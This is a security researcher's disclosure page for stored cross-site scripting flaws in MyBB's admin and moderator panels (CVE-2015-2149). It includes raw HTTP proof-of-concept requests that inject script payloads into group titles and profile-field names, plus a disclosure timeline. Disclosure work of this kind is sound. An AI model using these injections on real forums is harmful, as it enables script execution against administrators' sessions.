<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html;charset=utf-8">
        <meta name="description" content="Multiple stored cross-site scripting (XSS) vulnerabilities in MyBB">
        <meta name="keywords" content="CVE-2015-2149, CVE-2015-2149">
        <meta name="author" content="Adam Ziaja">
        <title>Multiple stored cross-site scripting (XSS) vulnerabilities in MyBB (CVE-2015-2149, CVE-2015-2149)</title>
        <style type="text/css">
            body {
                margin-top: 25px;
                margin-left: 25px;
                background-color: #222930;
            }
            body, p {
                font-family: 'Nunito', sans-serif;
                font-size: 13px;
                color: #E9E9E9;
                text-align: justify;
                -webkit-text-shadow: 0 1.5px 0 black;
                -moz-text-shadow: 0 1.5px 0 black;
                text-shadow: 0 1.5px 0 black;
            }
            a, a:visited {
                color: #4EB1BA;
                text-decoration: none;
            }
            a:hover {
                color: #6A9A1F;
            }
            strong {
                color: #E9C92D;
                font-weight: normal;
            }
            .info, .success, .warning, .error {
                border: 1px solid;
                padding:15px 15px 15px 15px;
                background-repeat: no-repeat;
                background-position: 10px center;
            }
            .info {
                color: #00529B;
                background-color: #BDE5F8;
            }
            .success {
                color: #4F8A10;
                background-color: #DFF2BF;
            }
            .warning {
                color: #9F6000;
                background-color: #FEEFB3;
            }
            .error {
                color: #D8000C;
                background-color: #FFBABA;
            }
            hr {
                width: 150px;
                margin-left: 0;
                text-align: left;
            }
            pre {
                white-space: pre-wrap;       /* css-3 */
                white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
                white-space: -pre-wrap;      /* Opera 4-6 */
                white-space: -o-pre-wrap;    /* Opera 7 */
                word-wrap: break-word;       /* Internet Explorer 5.5+ */
            }
        </style>
        <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet" type="text/css">
        <!-- SyntaxHighlighter: poczÄ…tek -->
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shCore.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPHP.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPython.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPerl.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPlain.js"></script>
        <link href="/poc/syntaxhighlighter/styles/shCore.css" rel="stylesheet" type="text/css" />
        <link href="/poc/syntaxhighlighter/styles/shThemeFadeToGrey.css" rel="stylesheet" type="text/css" />
        <script type="text/javascript">
            SyntaxHighlighter.all()
        </script>
        <!-- SyntaxHighlighter: koniec -->
    </head>
    <body>
        <p>Multiple stored cross-site scripting (XSS) vulnerabilities in MyBB:</p>

        <p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2149" target="_blank">CVE-2015-2149</a> &mdash; <strong>Cross-site scripting (XSS) vulnerability in Mod CP and Admin CP in <u>MyBB 1.8.3</u> and earlier allows remote attackers to inject arbitrary web script or HTML.</strong></p>
        <p>Proof of Concept:</p>
        <pre class="brush: text">POST /mybb/admin/index.php?module=user-groups&amp;action=edit&amp;gid=4 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://localhost/mybb/admin/index.php?module=user-groups&amp;action=edit&amp;gid=4
Cookie: mybbuser=1_hPwCJylOqlpxxvUTgZkngdjPxoloR74ek1gsOhpxL6lO8ZTtKC; sid=6af4e8e55ca66d31fd946e3368893516; acploginattempts=0; adminsid=d28125ba4e1e7de2fb5e3bb8085a4baf; inlinemod_useracp=%7C2%7C
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1418

my_post_key=9b2e4af17311948ce86eb067a14570c7&amp;title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;description=The+group+all+administrators+belong+to.&amp;namestyle=%3Cspan+style%3D%22color%3A+green%3B%22%3E%3Cstrong%3E%3Cem%3E%7Busername%7D%3C%2Fem%3E%3C%2Fstrong%3E%3C%2Fspan%3E&amp;usertitle=&amp;stars=7&amp;starimage=images%2Fstar.png&amp;image=&amp;showmemberlist=1&amp;showforumteam=1&amp;issupermod=1&amp;canmodcp=1&amp;cancp=1&amp;canview=1&amp;canviewthreads=1&amp;cansearch=1&amp;canviewprofiles=1&amp;candlattachments=1&amp;canviewboardclosed=1&amp;canpostthreads=1&amp;canpostreplys=1&amp;canratethreads=1&amp;maxposts=0&amp;canpostpolls=1&amp;canvotepolls=1&amp;canundovotes=1&amp;canpostattachments=1&amp;attachquota=0&amp;caneditposts=1&amp;candeleteposts=1&amp;candeletethreads=1&amp;caneditattachments=1&amp;edittimelimit=0&amp;canusercp=1&amp;canchangename=1&amp;cancustomtitle=1&amp;canuploadavatars=1&amp;canusesig=1&amp;canchangewebsite=1&amp;canusesigxposts=0&amp;usereputationsystem=1&amp;cangivereputations=1&amp;reputationpower=2&amp;maxreputationsperthread=0&amp;maxreputationsday=0&amp;canwarnusers=1&amp;canreceivewarnings=1&amp;maxwarningsday=0&amp;canusepms=1&amp;cansendpms=1&amp;cantrackpms=1&amp;candenypmreceipts=1&amp;pmquota=0&amp;maxpmrecipients=0&amp;canviewcalendar=1&amp;canaddevents=1&amp;canbypasseventmod=1&amp;canmoderateevents=1&amp;canviewonline=1&amp;canviewwolinvis=1&amp;canviewonlineips=1&amp;canviewmemberlist=1&amp;showinbirthdaylist=1&amp;cansendemail=1&amp;maxemails=0&amp;emailfloodtime=0&amp;canmanageannounce=1&amp;canmanagemodqueue=1&amp;canmanagereportedcontent=1&amp;canviewmodlogs=1&amp;caneditprofiles=1&amp;canbanusers=1&amp;canviewwarnlogs=1&amp;canuseipsearch=1
        </pre>

        <p>
            and XSS work on i.a.:<br>
            &bull; http://localhost/mybb/admin/index.php?module=user-groups<br>
            &bull; http://localhost/mybb/admin/index.php?module=user-users&amp;action=edit&amp;uid=1<br>
            &bull; http://localhost/mybb/admin/index.php?module=user-users&amp;action=add<br>
            &bull; http://localhost/mybb/modcp.php?action=finduser<br>
            (in "description" is also XSS, but work on fewer pages)<br><br>
            <img src="community_mybb_com-xss_alert.png" alt=""><br>
            <img src="community_mybb_com-mybb_acp.png" alt="">
        </p>
        <!--
                <br>
                <p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2149" target="_blank">CVE-2015-2149</a> &mdash; <strong>Cross-site scripting (XSS) vulnerability in Mod CP and Admin CP in <u>MyBB 1.6.13</u> and earlier allows remote attackers to inject arbitrary web script or HTML.</strong></p>
                <p>Proof of Concept:</p>
        <pre class="brush: text">
        POST http://localhost/mybb/admin/index.php?module=user-groups&amp;action=edit&amp;gid=4 HTTP/1.1
        Host: localhost
        Proxy-Connection: keep-alive
        Content-Length: 1196
        Cache-Control: max-age=0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Origin: http://localhost
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/29.0.1547.65 Chrome/29.0.1547.65 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Referer: http://localhost/mybb/admin/index.php?module=user-groups&amp;action=edit&amp;gid=4
        Accept-Encoding: sdch
        Accept-Language: pl-PL,pl;q=0.8,en-US;q=0.6,en;q=0.4
        Cookie: mybb[lastvisit]=1387132366; mybb[lastactive]=1387132375; loginattempts=1; mybbuser=1_BTLKMVfnKgP1UR6SdXt1DuMh6Toqd9GStuFY1BQOUp6dltdm3c; adminsid=210f3de946b87be401e5780f6a2323d7; acploginattempts=0; sid=77ee43183439f047543a90615de70a89
        
        my_post_key=1c35bada79db89f75d0cdf16c587dae7&amp;title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;description=The+group+all+administrators+belong+to.&amp;namestyle=%3Cspan+style%3D%22color%3A+green%3B%22%3E%3Cstrong%3E%3Cem%3E%7Busername%7D%3C%2Fem%3E%3C%2Fstrong%3E%3C%2Fspan%3E&amp;usertitle=Administrator&amp;stars=7&amp;starimage=images%2Fstar.gif&amp;image=&amp;showforumteam=1&amp;issupermod=1&amp;canmodcp=1&amp;cancp=1&amp;canview=1&amp;canviewthreads=1&amp;cansearch=1&amp;canviewprofiles=1&amp;candlattachments=1&amp;canpostthreads=1&amp;canpostreplys=1&amp;canratethreads=1&amp;canpostpolls=1&amp;canvotepolls=1&amp;canundovotes=1&amp;canpostattachments=1&amp;attachquota=0&amp;caneditposts=1&amp;candeleteposts=1&amp;candeletethreads=1&amp;caneditattachments=1&amp;canusercp=1&amp;canchangename=1&amp;cancustomtitle=1&amp;canuploadavatars=1&amp;canusesig=1&amp;canusesigxposts=0&amp;usereputationsystem=1&amp;cangivereputations=1&amp;reputationpower=2&amp;maxreputationsperthread=0&amp;maxreputationsday=0&amp;canwarnusers=1&amp;canreceivewarnings=1&amp;maxwarningsday=0&amp;canusepms=1&amp;cansendpms=1&amp;cantrackpms=1&amp;candenypmreceipts=1&amp;pmquota=0&amp;maxpmrecipients=0&amp;canviewcalendar=1&amp;canaddevents=1&amp;canbypasseventmod=1&amp;canmoderateevents=1&amp;canviewonline=1&amp;canviewwolinvis=1&amp;canviewonlineips=1&amp;canviewmemberlist=1&amp;showinbirthdaylist=1&amp;cansendemail=1&amp;maxemails=0
        </pre>
        
        <p>
        and XSS work on:<br>
        http://localhost/mybb/admin/index.php?module=user-groups<br>
        http://localhost/mybb/admin/index.php?module=user-users&amp;action=edit&amp;uid=1<br>
        http://localhost/mybb/admin/index.php?module=user-users&amp;action=add<br>
        http://localhost/mybb/modcp.php?action=finduser
        </p>
        -->
        <br>
        <p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2149" target="_blank">CVE-2015-2149</a> &mdash; <strong>Cross-site scripting (XSS) vulnerability in Mod CP and Admin CP in <u>MyBB 1.6.12</u> and earlier allows remote attackers to inject arbitrary web script or HTML.</strong></p>
        <p>Proof of Concept:</p>
        <pre class="brush: text">POST http://localhost/mybb/admin/index.php?module=config-profile_fields&amp;action=edit HTTP/1.1
Host: localhost
Proxy-Connection: keep-alive
Content-Length: 295
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: http://localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/29.0.1547.65 Chrome/29.0.1547.65 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/mybb/admin/index.php?module=config-profile_fields&amp;action=edit&amp;fid=3
Accept-Encoding: sdch
Accept-Language: pl-PL,pl;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: mybb[lastvisit]=1387132366; mybb[lastactive]=1387132375; loginattempts=1; mybbuser=1_BTLKMVfnKgP1UR6SdXt1DuMh6Toqd9GStuFY1BQOUp6dltdm3c; adminsid=210f3de946b87be401e5780f6a2323d7; acploginattempts=0

my_post_key=1c35bada79db89f75d0cdf16c587dae7&amp;fid=3&amp;name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;description=Please+select+your+sex+from+the+list+below.&amp;fieldtype=select&amp;maxlength=0&amp;length=0&amp;options=Undisclosed%0D%0AMale%0D%0AFemale%0D%0AOther&amp;disporder=0&amp;required=0&amp;editable=1&amp;hidden=0&amp;postnum=0
        </pre>

        <p>
            and XSS work on i.a.:<br>
            &bull; http://localhost/mybb/admin/index.php?module=user-users&amp;action=edit&amp;uid=1<br>
            &bull; http://localhost/mybb/modcp.php?action=editprofile&amp;uid=1
        </p>
        <br>
        <p>
            <strong>Timeline</strong>:<br>
            2013-12-15 &mdash; reported on mybb.com e-mail, no answer<br>
            2013-12-28 &mdash; <a href="community_mybb_com-thread_149380-post_1054359.png" target="_blank">reported on mybb.com</a> (<a href="https://en.wikipedia.org/wiki/Responsible_disclosure" target="_blank">responsible disclosure</a>)<br>
            2014-04-26 &mdash; "silent" fix "<i>POST admin/index.php?module=config-profile_fields&amp;action=edit</i>" XSS ("<i>POST admin/index.php?module=user-groups&amp;action=edit&amp;gid=4</i>" still work!) in <u>security release</u> MyBB 1.6.13 &mdash; lack of information in the changelog etc about XSS vulnerability in Mod CP and Admin CP<br>
            2015-01-16 &mdash; XSS still work (reported in MyBB 1.6.12 &mdash; 13 months earlier) in the latest version MyBB 1.8.3, disclosed on twitter<br>
            2015-02-15 &mdash; fixed in <a href="https://blog.mybb.com/2015/02/15/mybb-1-8-4-released-feature-update-security-maintenance-release/" target="_blank">MyBB 1.8.4</a>
        </p>
        <br>
        <hr>
        <p>
            <strong>Adam Ziaja</strong> &lt;<a href="https://adamziaja.com">&#97;&#100;&#97;&#109;&#64;&#97;&#100;&#97;&#109;&#122;&#105;&#97;&#106;&#97;&#46;&#99;&#111;&#109;</a>&gt;
        </p>
    </body>
</html>
